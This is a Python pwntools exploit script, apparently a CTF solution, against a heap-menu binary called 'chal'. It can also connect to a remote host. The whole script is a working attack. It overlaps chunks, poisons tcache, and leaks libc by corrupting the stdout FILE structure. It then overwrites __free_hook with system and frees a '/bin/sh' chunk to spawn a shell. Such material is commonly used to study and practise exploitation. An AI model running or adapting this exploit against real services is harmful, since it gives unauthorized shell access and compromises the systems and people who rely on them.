#!/usr/bin/env python3
# Local Ubuntu 20.04

from pwn import *

context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = "./chal"
elf  = ELF(BINARY, checksec=False)

def Connect():
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "172.31.3.2"
    PORT = 4240
    s = remote(HOST, PORT)
  else:
    s = process(BINARY)
  return s

def Add(idx, size):
  s.sendlineafter(b"> ", b"1")
  s.sendlineafter(b"index > ", str(idx).encode())  
  s.sendlineafter(b"size > ", str(size).encode())  

def Delete(idx):
  s.sendlineafter(b"> ", b"2")
  s.sendlineafter(b"index > ", str(idx).encode()) 

def Edit(idx, data):
  s.sendlineafter(b"> ", b"3")
  s.sendlineafter(b"index > ", str(idx).encode())  
  s.sendafter(b"content > ", data) 

def Copy(idx1, idx2):
  s.sendlineafter(b"> ", b"4")
  s.sendlineafter(b"index1 > ", str(idx1).encode()) 
  s.sendlineafter(b"inde2 > ", str(idx2).encode()) 

def Exit():
  s.sendlineafter(b"> ", b"5")
  
s = Connect()

Add(0, 0x430)
Add(1, 0x28)
Delete(0)

# overlap chunk
Add(2, 0x20)
Add(3, 0x20)
Add(4, 0x20)
Add(5, 0x20)
Edit(0, b"A"*0x28+p64(0x421))
Edit(1, (p64(0)+p64(0x11))*2)
Delete(3)

# tcache poisoning
Delete(4)
Delete(5)
Add(6, 0x320)
Add(7, 0x50)
Edit(5, "\xa0\x46")

# libc leak
Add(8, 0x20)
Add(9, 0x28)
Edit(9, p64(0xfbad3c80)+p64(0)*3+b"\x00")
s.recvn(8)
libc_leak = u64(s.recvn(8))
libc_base = libc_leak - (0x7ffff7fc3980 - 0x7ffff7dd7000)
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# tcache poisoning 
Edit(0, b"A"*0x28+p64(0x031))
Delete(3)
Delete(0)
libc = elf.libc
free_hook = libc_base + libc.sym.__free_hook
Edit(0, p64(free_hook))

# write system address in __free_hook
Add(10, 0x20)
Add(11, 0x20)
system_addr = libc_base + libc.sym.system
Edit(11, p64(system_addr))

# start system("/bin/sh")
Edit(10, b"/bin/sh\x00")
Delete(10)

s.interactive()   
